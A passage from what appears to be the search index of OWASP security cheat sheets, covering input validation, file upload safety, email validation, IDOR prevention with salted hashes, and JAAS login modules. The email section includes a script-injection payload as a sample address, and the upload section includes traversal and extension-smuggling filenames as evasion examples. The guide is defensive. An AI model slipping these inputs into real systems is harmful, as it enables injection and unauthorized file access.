fully legitimate. For more information on XSS filter evasion please see the this wiki page . White list validation is appropriate for all input fields provided by the user. White list validation involves defining exactly what IS authorized, and by definition, everything else is not authorized. If it's well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern, usually based on regular expressions, for validating such input. If the input field comes from a fixed set of options, like a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place.","title":"Whitelisting vs blacklisting"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#validating-free-form-unicode-text","text":"Free-form text, especially with Unicode characters, is perceived as difficult to validate due to a relatively large space of characters that need to be whitelisted. It's also free-form text input that highlights the importance of proper context-aware output encoding and quite clearly demonstrates that input validation is not the primary safeguards against Cross-Site Scripting. If your users want to type apostrophe ' or less-than sign < in their comment field, they might have perfectly legitimate reason for that and the application's job is to properly handle it throughout the whole life cycle of the data. The primary means of input validation for free-form text input should be: Normalization: Ensure canonical encoding is used across all the text and no invalid characters are present. Character category whitelisting: Unicode allows whitelisting categories such as \"decimal digits\" or \"letters\" which not only covers the Latin alphabet but also various other scripts used globally (e.g. Arabic, Cyrillic, CJK ideographs etc). Individual character whitelisting: If you allow letters and ideographs in names and also want to allow apostrophe ' for Irish names, but don't want to allow the whole punctuation category. References: Input validation of free-form Unicode text in Python","title":"Validating free-form Unicode text"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#regular-expressions","text":"Developing regular expressions can be complicated, and is well beyond the scope of this cheat sheet. There are lots of resources on the internet about how to write regular expressions, including this site and the OWASP Validation Regex Repository . In summary, input validation should: Be applied to all input data, at minimum. Define the allowed set of characters to be accepted. Define a minimum and maximum length for the data (e.g. {1,25} ).","title":"Regular expressions"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#white-list-regular-expression-examples","text":"Validating a U.S. Zip Code (5 digits plus optional -4) ^\\d{5}(-\\d{4})?$ Validating U.S. State Selection From a Drop-Down Menu ^(AA|AE|AP|AL|AK|AS|AZ|AR|CA|CO|CT|DE|DC|FM|FL|GA|GU| HI|ID|IL|IN|IA|KS|KY|LA|ME|MH|MD|MA|MI|MN|MS|MO|MT|NE| NV|NH|NJ|NM|NY|NC|ND|MP|OH|OK|OR|PW|PA|PR|RI|SC|SD|TN| TX|UT|VT|VI|VA|WA|WV|WI|WY)$ Java Regex Usage Example: Example validating the parameter \"zip\" using a regular expression. private static final Pattern zipPattern = Pattern . compile ( \"^\\d{5}(-\\d{4})?$\" ); public void doPost ( HttpServletRequest request , HttpServletResponse response ) { try { String zipCode = request . getParameter ( \"zip\" ); if ( ! zipPattern . matcher ( zipCode ). matches () { throw new YourValidationException ( \"Improper zipcode format.\" ); } // do what you want here, after its been validated .. } catch ( YourValidationException e ) { response . sendError ( response . SC_BAD_REQUEST , e . getMessage () ); } } Some white list validators have also been predefined in various open source packages that you can leverage. For example: Apache Commons Validator","title":"White List Regular Expression Examples"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#client-side-vs-server-side-validation","text":"Be aware that any JavaScript input validation performed on the client can be bypassed by an attacker that disables JavaScript or uses a Web Proxy. Ensure that any input validation performed on the client is also performed on the server.","title":"Client Side vs Server Side Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#validating-rich-user-content","text":"It is very difficult to validate rich content submitted by a user. For more information, please see the XSS cheatsheet on Sanitizing HTML Markup with a Library Designed for the Job .","title":"Validating Rich User Content"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#preventing-xss-and-content-security-policy","text":"All user data controlled must be encoded when returned in the HTML page to prevent the execution of malicious data (e.g. XSS). For example <script> would be returned as &lt;script&gt; The type of encoding is specific to the context of the page where the user controlled data is inserted. For example, HTML entity encoding is appropriate for data placed into the HTML body. However, user data placed into a script would need JavaScript specific output encoding. Detailed information on XSS prevention here: OWASP XSS Prevention Cheat Sheet","title":"Preventing XSS and Content Security Policy"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#file-upload-validation","text":"Many websites allow users to upload files, such as a profile picture or more. This section helps provide that feature securely. Check the File Upload Cheat Sheet .","title":"File Upload Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#upload-verification","text":"Use input validation to ensure the uploaded filename uses an expected extension type. Ensure the uploaded file is not larger than a defined maximum file size. If the website supports ZIP file upload, do validation check before unzip the file. The check includes the target path, level of compress, estimated unzip size.","title":"Upload Verification"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#upload-storage","text":"Use a new filename to store the file on the OS. Do not use any user controlled text for this filename or for the temporary filename. When the file is uploaded to web, it's suggested to rename the file on storage. For example, the uploaded filename is test.JPG , rename it to JAI1287uaisdjhf.JPG with a random filename. The purpose of doing it to prevent the risks of direct file access and ambiguous filename to evalide the filter, such as test.jpg;.asp or /../../../../../test.jpg . Uploaded files should be analyzed for malicious content (anti-malware, static analysis, etc). The file path should not be able to specify by client side. It's decided by server side.","title":"Upload Storage"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#public-serving-of-uploaded-content","text":"Ensure uploaded images are served with the correct content-type (e.g. image/jpeg, application/x-xpinstall)","title":"Public Serving of Uploaded Content"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#beware-of-special-files","text":"The upload feature should be using a whitelist approach to only allow specific file types and extensions. However, it is important to be aware of the following file types that, if allowed, could result in security vulnerabilities: crossdomain.xml / clientaccesspolicy.xml: allows cross-domain data loading in Flash, Java and Silverlight. If permitted on sites with authentication this can permit cross-domain data theft and CSRF attacks. Note this can get pretty complicated depending on the specific plugin version in question, so its best to just prohibit files named \"crossdomain.xml\" or \"clientaccesspolicy.xml\". .htaccess and .htpasswd: Provides server configuration options on a per-directory basis, and should not be permitted. See HTACCESS documentation . Web executable script files are suggested not to be allowed such as aspx, asp, css, swf, xhtml, rhtml, shtml, jsp, js, pl, php, cgi .","title":"Beware of \"special\" files"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#image-upload-verification","text":"Use image rewriting libraries to verify the image is valid and to strip away extraneous content. Set the extension of the stored image to be a valid image extension based on the detected content type of the image from image processing (e.g. do not just trust the header from the upload). Ensure the detected content type of the image is within a list of defined image types (jpg, png, etc)","title":"Image Upload Verification"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#email-address-validation","text":"","title":"Email Address Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#syntactic-validation","text":"The format of email addresses is defined by RFC 5321 , and is far more complicated than most people realise. As an example, the following are all considered to be valid email addresses: \"><script>alert(1);</script>\"@example.org user+subaddress@example.org user@[IPv6:2001:db8::1] \" \"@example.org Properly parsing email addresses for validity with regular expressions is very complicated, although there are a number of publicly available documents on regex . The biggest caveat on this is that although the RFC defines a very flexible format for email addresses, most real world implementations (such as mail servers) use a far more restricted address format, meaning that they will reject addresses that are technically valid. Although they may be technically correct, these addresses are of little use if your application will not be able to actually send emails to them. As such, the best way to validate email addresses is to perform some basic initial validation, and then pass the address to the mail server and catch the exception if it rejects it. This means that any the application can be confident that its mail server can send emails to any addresses it accepts. The initial validation could be as simple as: The email address contains two parts, separated with an @ symbol. The email address does not contain dangerous characters (such as backticks, single or double quotes, or null bytes). Exactly which characters are dangerous will depend on how the address is going to be used (echoed in page, inserted into database, etc). The domain part contains only letters, numbers, hyphens ( - ) and periods ( . ). The email address is a reasonable length: The local part (before the @ ) should be no more than 63 characters. The total length should be no more than 254 characters.","title":"Syntactic Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#semantic-validation","text":"Semantic validation is about determining whether the email address is correct and legitimate. The most common way to do this is to send an email to the user, and require that they click a link in the email, or enter a code that has been sent to them. This provides a basic level of assurance that: The email address is correct. The application can successfully send emails to it. The user has access to the mailbox. The links that are sent to users to prove ownership should contain a token that is: At least 32 characters long. Generated using a secure source of randomness . Single use. Time limited (e.g, expiring after eight hours). After validating the ownership of the email address, the user should then be required to authenticate on the application through the usual mechanism.","title":"Semantic Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#disposable-email-addresses","text":"In some cases, users may not want to give their real email address when registering on the application, and will instead provide a disposable email address. These are publicly available addresses that do not require the user to authenticate, and are typically used to reduce the amount of spam received by users' primary email addresses. Blocking disposable email addresses is almost impossible, as there are a large number of websites offering these services, with new domains being created every day. There are a number of publicly available lists and commercial lists of known disposable domains, but these will always be incomplete. If these lists are used to block the use of disposable email addresses then the user should be presented with a message explaining why they are blocked (although they are likely to simply search for another disposable provider rather than giving their legitimate address). If it is essential that disposable email addresses are blocked, then registrations should only be allowed from specifically whitelisted email providers. However, if this includes public providers such as Google or Yahoo, users can simply register their own disposable address with them.","title":"Disposable Email Addresses"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#sub-addressing","text":"Sub-addressing allows a user to specify a tag in the local part of the email address (before the @ sign), which will be ignored by the mail server. For example, if that example.org domain supports sub-addressing, then the following email addresses are equivalent: user@example.org user+site1@example.org user+site2@example.org Many mail providers (such as Microsoft Exchange) do not support sub-addressing. The most notable provider who does is Gmail, although there are many others that also do. Some users will use a different tag for each website they register on, so that if they start receiving spam to one of the sub-addresses they can identify which website leaked or sold their email address. Because it could allow users to register multiple accounts with a single email address, some sites may wish to block sub-addressing by stripping out everything between the + and @ signs. This is not generally recommended, as it suggests that the website owner is either unaware of sub-addressing or wishes to prevent users from identifying them when they leak or sell email addresses. Additionally, it can be trivially bypassed by using disposable email addresses , or simply registering multiple email accounts with a trusted provider.","title":"Sub-Addressing"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html","text":"Insecure Direct Object Reference Prevention Cheat Sheet \u00b6 Introduction \u00b6 I nsecure D irect O bject R eference (called IDOR from here) occurs when a application exposes a reference to an internal implementation object. Using this way, it reveals the real identifier and format/pattern used of the element in the storage backend side. The most common example of it (although is not limited to this one) is a record identifier in a storage system (database, filesystem and so on). IDOR is referenced in element A4 of the OWASP Top 10 in the 2013 edition. Context \u00b6 IDOR do not bring a direct security issue because, by itself, it reveals only the format/pattern used for the object identifier. IDOR bring, depending on the format/pattern in place, a capacity for the attacker to mount a enumeration attack in order to try to probe access to the associated objects. Enumeration attack can be described in the way in which the attacker build a collection of valid identifiers using the discovered format/pattern and test them against the application. For example: Imagine an HR application exposing a service accepting employee ID in order to return the employee information and for which the format/pattern of the employee ID is the following: EMP-00000 EMP-00001 EMP-00002 ... Based on this, an attacker can build a collection of valid ID from EMP-00000 to EMP-99999 . To be exploited, an IDOR issue must be combined with an Access Control issue because it's the Access Control issue that \"allow\" the attacker to access to the object for which he have guessed the identifier through is enumeration attack. Additional remarks \u00b6 From Jeff Williams : Direct Object Reference is fundamentally a Access Control problem. We split it out to emphasize the difference between URL access control and data layer access control. You can't do anything about the data-layer problems with URL access control. And they're not really input validation problems either. But we see DOR manipulation all the time. If we list only \"Messed-up from the Floor-up Access Control\" then people will probably only put in SiteMinder or JEE declarative access control on URLs and call it a day. That's what we're trying to avoid. From Eric Sheridan : An object reference map is first populated with a list of authorized values which are temporarily stored in the session. When the user requests a field (ex: color=654321), the application does a lookup in this map from the session to determine the appropriate column name. If the value does not exist in this limited map, the user is not authorized. Reference maps should not be global (i.e. include every possible value), they are temporary maps/dictionaries that are only ever populated with authorized values. \"A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, database record, or key, as a URL or form parameter.\" I'm \"down\" with DOR's for files, directories, etc. But not so much for ALL databases primary keys. That's just insane, like you are suggesting. I think that anytime database primary keys are exposed, an access control rule is required. There is no way to practically DOR all database primary keys in a real enterprise or post-enterprise system. But, suppose a user has a list of accounts, like a bank where database ID 23456 is their checking account. I'd DOR that in a heartbeat. You need to be prudent about this. Objective \u00b6 This article propose an idea to prevent the exposure of real identifier in a simple, portable and stateless way because the proposal need to handle Session and Session-less application topologies. Proposition \u00b6 The proposal use a hash to replace the direct identifier. This hash is salted with a value defined at application level in order support topology in which the application is deployed in multi-instances mode (case for production). Using a hash allow the following properties: Do not require to maintain a mapping table (real ID vs front end ID) in user session or application level cache. Makes creation of a collection a enumeration values more difficult to achieve because, even if attacker can guess the hash algorithm from the ID size, it cannot reproduce value due to the salt that is not tied to the hidden value. This is the implementation of the utility class that generate the identifier to use for exchange with the front end side: import javax.xml.bind.DatatypeConverter ; import java.io.UnsupportedEncodingException ; import java.security.MessageDigest ; import java.security.NoSuchAlgorithmException ; /** * Handle the creation of ID that will be send to front end side * in order to prevent IDOR */ public class IDORUtil { /** * SALT used for the generation of the HASH of the real item identifier * in order to prevent to forge it on front end side. */ private static final String SALT = \"[READ_IT_FROM_APP_CONFIGURATION]\" ; /** * Compute a identifier that will be send to the front end and be used as item * unique identifier on client side. * * @param realItemBackendIdentifier Identifier of the item on the backend storage * (real identifier) * @return A string representing the identifier to use * @throws UnsupportedEncodingException If string's byte cannot be obtained * @throws NoSuchAlgorithmException If the hashing algorithm used is not * supported is not available */ public static String computeFrontEndIdentifier ( String realItemBackendIdentifier ) throws NoSuchAlgorithmException , UnsupportedEncodingException { String frontEndId = null ; if ( realItemBackendIdentifier != null && ! realItemBackendIdentifier . trim (). isEmpty ()) { //Prefix the value with the SALT String tmp = SALT + realItemBackendIdentifier ; //Get and configure message digester //We use SHA1 here for the following reason even if SHA1 have now potential collision: //1. We do not store sensitive information, just technical ID //2. We want that the ID stay short but not guessable //3. We want that a maximum of backend storage support the algorithm used in order to compute it in selection query/request //If your backend storage supports SHA256 so use it instead of SHA1 MessageDigest digester = MessageDigest . getInstance ( \"sha1\" ); //Compute the hash byte [] hash = digester . digest ( tmp . getBytes ( \"utf-8\" )); //Encode is in HEX frontEndId = DatatypeConverter . printHexBinary ( hash ); } return frontEndId ; } } This is the example of services using the front identifier: /** * Service to list all available movies * * @return The collection of movies ID and name as JSON response */ @RequestMapping ( value = \"/movies\" , method = GET , produces = { MediaType . APPLICATION_JSON_VALUE }) public Map < String , String > listAllMovies () { Map < String , String > result = new HashMap <> (); try { this . movies . forEach ( m -> { try { //Compute the front end ID fof the current element String frontEndId = IDORUtil . computeFrontEndIdentifier ( m . getBackendIdentifier ()); //Add the computed ID and the associated item name to the result map result . put ( frontEndId , m . getName ()); } catch ( Exception e ) { LOGGER . error ( \"Error during ID generation for real ID {}: {}\" , m . getBackendIdentifier (), e . getMessage ()); } }); } catch ( Exception e ) { //Ensure that in case of error no item is returned result . clear (); LOGGER . error ( \"Error during processing\" , e ); } return result ; } /** * Service to obtain the information on a specific movie * * @param id Movie identifier from a front end point of view * @return The movie object as JSON response */ @RequestMapping ( value = \"/movies/{id}\" , method = GET , produces = { MediaType . APPLICATION_JSON_VALUE }) public Movie obtainMovieName ( @PathVariable ( \"id\" ) String id ) { //Search for the wanted movie information using Front End Identifier Optional < Movie > movie = this . movies . stream (). filter ( m -> { boolean match ; try { //Compute the front end ID for the current element String frontEndId = IDORUtil . computeFrontEndIdentifier ( m . getBackendIdentifier ()); //Check if the computed ID match the one provided match = frontEndId . equals ( id ); } catch ( Exception e ) { //Ensure that in case of error no item is returned match = false ; LOGGER . error ( \"Error during processing\" , e ); } return match ; }). findFirst (); //We have marked the Backend Identifier class field as excluded //from the serialization //So we can send the object to front end through the serializer return movie . get (); } This is the value object used: public class Movie { /** * We indicate to serializer that this field must never be serialized * * @see \"https://fasterxml.github.io/jackson-annotations/javadoc/2.5/com/fasterxml/ * jackson/annotation/JsonIgnore.html\" */ @JsonIgnore private String backendIdentifier ; ... } Sources of the prototype \u00b6 GitHub repository .","title":"Insecure Direct Object Reference Prevention"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#insecure-direct-object-reference-prevention-cheat-sheet","text":"","title":"Insecure Direct Object Reference Prevention Cheat Sheet"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#introduction","text":"I nsecure D irect O bject R eference (called IDOR from here) occurs when a application exposes a reference to an internal implementation object. Using this way, it reveals the real identifier and format/pattern used of the element in the storage backend side. The most common example of it (although is not limited to this one) is a record identifier in a storage system (database, filesystem and so on). IDOR is referenced in element A4 of the OWASP Top 10 in the 2013 edition.","title":"Introduction"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#context","text":"IDOR do not bring a direct security issue because, by itself, it reveals only the format/pattern used for the object identifier. IDOR bring, depending on the format/pattern in place, a capacity for the attacker to mount a enumeration attack in order to try to probe access to the associated objects. Enumeration attack can be described in the way in which the attacker build a collection of valid identifiers using the discovered format/pattern and test them against the application. For example: Imagine an HR application exposing a service accepting employee ID in order to return the employee information and for which the format/pattern of the employee ID is the following: EMP-00000 EMP-00001 EMP-00002 ... Based on this, an attacker can build a collection of valid ID from EMP-00000 to EMP-99999 . To be exploited, an IDOR issue must be combined with an Access Control issue because it's the Access Control issue that \"allow\" the attacker to access to the object for which he have guessed the identifier through is enumeration attack.","title":"Context"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#additional-remarks","text":"From Jeff Williams : Direct Object Reference is fundamentally a Access Control problem. We split it out to emphasize the difference between URL access control and data layer access control. You can't do anything about the data-layer problems with URL access control. And they're not really input validation problems either. But we see DOR manipulation all the time. If we list only \"Messed-up from the Floor-up Access Control\" then people will probably only put in SiteMinder or JEE declarative access control on URLs and call it a day. That's what we're trying to avoid. From Eric Sheridan : An object reference map is first populated with a list of authorized values which are temporarily stored in the session. When the user requests a field (ex: color=654321), the application does a lookup in this map from the session to determine the appropriate column name. If the value does not exist in this limited map, the user is not authorized. Reference maps should not be global (i.e. include every possible value), they are temporary maps/dictionaries that are only ever populated with authorized values. \"A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, database record, or key, as a URL or form parameter.\" I'm \"down\" with DOR's for files, directories, etc. But not so much for ALL databases primary keys. That's just insane, like you are suggesting. I think that anytime database primary keys are exposed, an access control rule is required. There is no way to practically DOR all database primary keys in a real enterprise or post-enterprise system. But, suppose a user has a list of accounts, like a bank where database ID 23456 is their checking account. I'd DOR that in a heartbeat. You need to be prudent about this.","title":"Additional remarks"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#objective","text":"This article propose an idea to prevent the exposure of real identifier in a simple, portable and stateless way because the proposal need to handle Session and Session-less application topologies.","title":"Objective"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#proposition","text":"The proposal use a hash to replace the direct identifier. This hash is salted with a value defined at application level in order support topology in which the application is deployed in multi-instances mode (case for production). Using a hash allow the following properties: Do not require to maintain a mapping table (real ID vs front end ID) in user session or application level cache. Makes creation of a collection a enumeration values more difficult to achieve because, even if attacker can guess the hash algorithm from the ID size, it cannot reproduce value due to the salt that is not tied to the hidden value. This is the implementation of the utility class that generate the identifier to use for exchange with the front end side: import javax.xml.bind.DatatypeConverter ; import java.io.UnsupportedEncodingException ; import java.security.MessageDigest ; import java.security.NoSuchAlgorithmException ; /** * Handle the creation of ID that will be send to front end side * in order to prevent IDOR */ public class IDORUtil { /** * SALT used for the generation of the HASH of the real item identifier * in order to prevent to forge it on front end side. */ private static final String SALT = \"[READ_IT_FROM_APP_CONFIGURATION]\" ; /** * Compute a identifier that will be send to the front end and be used as item * unique identifier on client side. * * @param realItemBackendIdentifier Identifier of the item on the backend storage * (real identifier) * @return A string representing the identifier to use * @throws UnsupportedEncodingException If string's byte cannot be obtained * @throws NoSuchAlgorithmException If the hashing algorithm used is not * supported is not available */ public static String computeFrontEndIdentifier ( String realItemBackendIdentifier ) throws NoSuchAlgorithmException , UnsupportedEncodingException { String frontEndId = null ; if ( realItemBackendIdentifier != null && ! realItemBackendIdentifier . trim (). isEmpty ()) { //Prefix the value with the SALT String tmp = SALT + realItemBackendIdentifier ; //Get and configure message digester //We use SHA1 here for the following reason even if SHA1 have now potential collision: //1. We do not store sensitive information, just technical ID //2. We want that the ID stay short but not guessable //3. We want that a maximum of backend storage support the algorithm used in order to compute it in selection query/request //If your backend storage supports SHA256 so use it instead of SHA1 MessageDigest digester = MessageDigest . getInstance ( \"sha1\" ); //Compute the hash byte [] hash = digester . digest ( tmp . getBytes ( \"utf-8\" )); //Encode is in HEX frontEndId = DatatypeConverter . printHexBinary ( hash ); } return frontEndId ; } } This is the example of services using the front identifier: /** * Service to list all available movies * * @return The collection of movies ID and name as JSON response */ @RequestMapping ( value = \"/movies\" , method = GET , produces = { MediaType . APPLICATION_JSON_VALUE }) public Map < String , String > listAllMovies () { Map < String , String > result = new HashMap <> (); try { this . movies . forEach ( m -> { try { //Compute the front end ID fof the current element String frontEndId = IDORUtil . computeFrontEndIdentifier ( m . getBackendIdentifier ()); //Add the computed ID and the associated item name to the result map result . put ( frontEndId , m . getName ()); } catch ( Exception e ) { LOGGER . error ( \"Error during ID generation for real ID {}: {}\" , m . getBackendIdentifier (), e . getMessage ()); } }); } catch ( Exception e ) { //Ensure that in case of error no item is returned result . clear (); LOGGER . error ( \"Error during processing\" , e ); } return result ; } /** * Service to obtain the information on a specific movie * * @param id Movie identifier from a front end point of view * @return The movie object as JSON response */ @RequestMapping ( value = \"/movies/{id}\" , method = GET , produces = { MediaType . APPLICATION_JSON_VALUE }) public Movie obtainMovieName ( @PathVariable ( \"id\" ) String id ) { //Search for the wanted movie information using Front End Identifier Optional < Movie > movie = this . movies . stream (). filter ( m -> { boolean match ; try { //Compute the front end ID for the current element String frontEndId = IDORUtil . computeFrontEndIdentifier ( m . getBackendIdentifier ()); //Check if the computed ID match the one provided match = frontEndId . equals ( id ); } catch ( Exception e ) { //Ensure that in case of error no item is returned match = false ; LOGGER . error ( \"Error during processing\" , e ); } return match ; }). findFirst (); //We have marked the Backend Identifier class field as excluded //from the serialization //So we can send the object to front end through the serializer return movie . get (); } This is the value object used: public class Movie { /** * We indicate to serializer that this field must never be serialized * * @see \"https://fasterxml.github.io/jackson-annotations/javadoc/2.5/com/fasterxml/ * jackson/annotation/JsonIgnore.html\" */ @JsonIgnore private String backendIdentifier ; ... }","title":"Proposition"},{"location":"cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#sources-of-the-prototype","text":"GitHub repository .","title":"Sources of the prototype"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html","text":"JAAS Cheat Sheet \u00b6 Introduction - What is JAAS authentication \u00b6 The process of verifying the identity of a user or another system is authentication. JAAS , as an authentication framework manages the authenticated user's identity and credentials from login to logout. The JAAS authentication lifecycle: Create LoginContext . Read the configuration file for one or more LoginModules to initialize. Call LoginContext.initialize() for each LoginModule to initialize. Call LoginContext.login() for each LoginModule. If login successful then call LoginContext.commit() else call LoginContext.abort() Configuration file \u00b6 The JAAS configuration file contains a LoginModule stanza for each LoginModule available for logging on to the application. A stanza from a JAAS configuration file: Branches { USNavy.AppLoginModule required debug=true succeeded=true; } Note the placement of the semicolons, terminating both LoginModule entries and stanzas. The word required indicates the LoginContext 's login() method must be successful when logging in the user. The LoginModule -specific values debug and succeeded are passed to the LoginModule . They are defined by the LoginModule and their usage is managed inside the LoginModule . Note, Options are Configured using key-value pairing such as debug=\"true\" and the key and value should be separated by a = sign. Main.java (The client) \u00b6 Execution syntax: Java \u2013Djava.security.auth.login.config==packageName/packageName.config packageName.Main Stanza1 Where: packageName is the directory containing the config file. packageName.config specifies the config file in the Java package, packageName. packageName.Main specifies Main.java in the Java package, packageName. Stanza1 is the name of the stanza Main() should read from the config file. When executed, the 1st command-line argument is the stanza from the config file. The Stanza names the LoginModule to be used. The 2nd argument is the CallbackHandler . Create a new LoginContext with the arguments passed to Main.java . loginContext = new LoginContext (args[0], new AppCallbackHandler()); Call the LoginContext.Login Module: loginContext.login(); The value in succeeded Option is returned from loginContext.login() . If the login was successful, a subject was created. LoginModule.java \u00b6 A LoginModule must have the following authentication methods: initialize() login() commit() abort() logout() initialize() \u00b6 In Main() , after the LoginContext reads the correct stanza from the config file, the LoginContext instantiates the LoginModule specified in the stanza. initialize() methods signature: Public void initialize (Subject subject, CallbackHandler callbackHandler, Map sharedState, Map options) The arguments above should be saved as follows: this.subject = subject; this.callbackHandler = callbackHandler; this.sharedState = sharedState; this.options = options; What the initialize() method does: Builds a subject object of the Subject class contingent on a successful login() . Sets the CallbackHandler which interacts with the user to gather login information. If a LoginContext specifies 2 or more LoginModules, which is legal, they can share information via a sharedState map. Saves state information such as debug and succeeded in an options Map. login() \u00b6 Captures user supplied login information. The code snippet below declares an array of two callback objects which, when passed to the callbackHandler.handle method in the callbackHandler.java program, will be loaded with a username and password provided interactively by the user: NameCallback nameCB = new NameCallback ( \"Username\" ); PasswordCallback passwordCB = new PasswordCallback ( \"Password\" , false ); Callback [] callbacks = new Callback [] { nameCB , passwordCB }; callbackHandler . handle ( callbacks ); Authenticates the user Retrieves the user supplied information from the callback objects: String ID = nameCallback.getName (); char[] tempPW = passwordCallback.getPassword (); Compare name and tempPW to values stored in a repository such as LDAP. Set the value of the variable succeeded and return to Main() . commit() \u00b6 Once the users credentials are successfully verified during login() , the JAAS authentication framework associates the credentials, as needed, with the subject. There are two types of credentials, Public and Private : Public credentials include public keys. Private credentials include passwords and public keys. Principals (i.e. Identities the subject has other than their login name) such as employee number or membership ID in a user group are added to the subject. Below, is an example commit() method where first, for each group the authenticated user has membership in, the group name is added as a principal to the subject. The subject's username is then added to their public credentials. Code snippet setting then adding any principals and a public credentials to a subject: public boolean commit () { If ( userAuthenticated ) { Set groups = UserService . findGroups ( username ); for ( Iterator itr = groups . iterator (); itr . hasNext (); { String groupName = ( String ) itr . next (); UserGroupPrincipal group = new UserGroupPrincipal ( GroupName ); subject . getPrincipals (). add ( group ); } UsernameCredential cred = new UsernameCredential ( username ); subject . getPublicCredentials (). add ( cred ); } } abort() \u00b6 The abort() method is called when authentication doesn't succeed. Before the abort() method exits the LoginModule , care should be taken to reset state including the username and password input fields. logout() \u00b6 The release of the users principals and credentials when LoginContext.logout is called: public boolean logout () { if ( ! subject . isReadOnly ()) { Set principals = subject . getPrincipals ( UserGroupPrincipal . class ); subject . getPrincipals (). removeAll ( principals ); Set creds = subject . getPublicCredentials ( UsernameCredential . class ); subject . getPublicCredentials (). removeAll ( creds ); return true ; } else { return false ; } } CallbackHandler.java \u00b6 The callbackHandler is in a source ( .java ) file separate from any single LoginModule so that it can service a multitude of LoginModules with differing callback objects: Creates instance of the CallbackHandler class and has only one method, handle() . A CallbackHandler servicing a LoginModule requiring username & password to login: public void handle ( Callback [] callbacks ) { for ( int i = 0 ; i < callbacks . length ; i ++ ) { Callback callback = callbacks [ i ] ; if ( callback instanceof NameCallback ) { NameCallback nameCallBack = ( NameCallback ) callback ; nameCallBack . setName ( username ); } else if ( callback instanceof PasswordCallback ) { PasswordCallback passwordCallBack = ( PasswordCallback ) callback ; passwordCallBack . setPassword ( password . toCharArray ()); } } } Related Articles \u00b6 JAAS in Action , Michael Cot\u00e9, posted on September 27, 2009, URL as 5/14/2012. Pistoia Marco, Nagaratnam Nataraj, Koved Larry, Nadalin Anthony from book \"Enterprise Java Security\" - Addison-Wesley, 2004 . Disclosure \u00b6 All of the code in the attached JAAS cheat sheet has been copied verbatim from this free source .","title":"JAAS"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#jaas-cheat-sheet","text":"","title":"JAAS Cheat Sheet"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#introduction-what-is-jaas-authentication","text":"The process of verifying the identity of a user or another system is authentication. JAAS , as an authentication framework manages the authenticated user's identity and credentials from login to logout. The JAAS authentication lifecycle: Create LoginContext . Read the configuration file for one or more LoginModules to initialize. Call LoginContext.initialize() for each LoginModule to initialize. Call LoginContext.login() for each LoginModule. If login successful then call LoginContext.commit() else call LoginContext.abort()","title":"Introduction - What is JAAS authentication"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#configuration-file","text":"The JAAS configuration file contains a LoginModule stanza for each LoginModule available for logging on to the application. A stanza from a JAAS configuration file: Branches { USNavy.AppLoginModule required debug=true succeeded=true; } Note the placement of the semicolons, terminating both LoginModule entries and stanzas. The word required indicates the LoginContext 's login() method must be successful when logging in the user. The LoginModule -specific values debug and succeeded are passed to the LoginModule . They are defined by the LoginModule and their usage is managed inside the LoginModule . Note, Options are Configured using key-value pairing such as debug=\"true\" and the key and value should be separated by a = sign.","title":"Configuration file"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#mainjava-the-client","text":"Execution syntax: Java \u2013Djava.security.auth.login.config==packageName/packageName.config packageName.Main Stanza1 Where: packageName is the directory containing the config file. packageName.config specifies the config file in the Java package, packageName. packageName.Main specifies Main.java in the Java package, packageName. Stanza1 is the name of the stanza Main() should read from the config file. When executed, the 1st command-line argument is the stanza from the config file. The Stanza names the LoginModule to be used. The 2nd argument is the CallbackHandler . Create a new LoginContext with the arguments passed to Main.java . loginContext = new LoginContext (args[0], new AppCallbackHandler()); Call the LoginContext.Login Module: loginContext.login(); The value in succeeded Option is returned from loginContext.login() . If the login was successful, a subject was created.","title":"Main.java (The client)"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#loginmodulejava","text":"A LoginModule must have the following authentication methods: initialize() login() commit() abort() logout()","title":"LoginModule.java"},{"location":"cheatsheets/JAAS_Cheat_Sheet.html#initialize","text":"In Main() , after the LoginContext reads the correct stanza from the config file, the LoginContext instantiates the LoginModule specified in the stanza. initialize() methods signature: Public void initialize (Subject subject, CallbackHandler callbackHandler, Map sharedState, Map options) The arguments above should be saved as follows: this.subject = subject; this.callbackHandler = callbackHandler; this.sharedState = sharedState; this.options = options; What the initialize() method does: Builds a subject object of the Subject class contingent on a successful login() . Sets the CallbackHandler which interacts with the user to gather login information. If a LoginContext specifies 2 or more LoginModules, which is legal, they can share information via a sharedState map. Saves state information such as debug and succeeded in an options 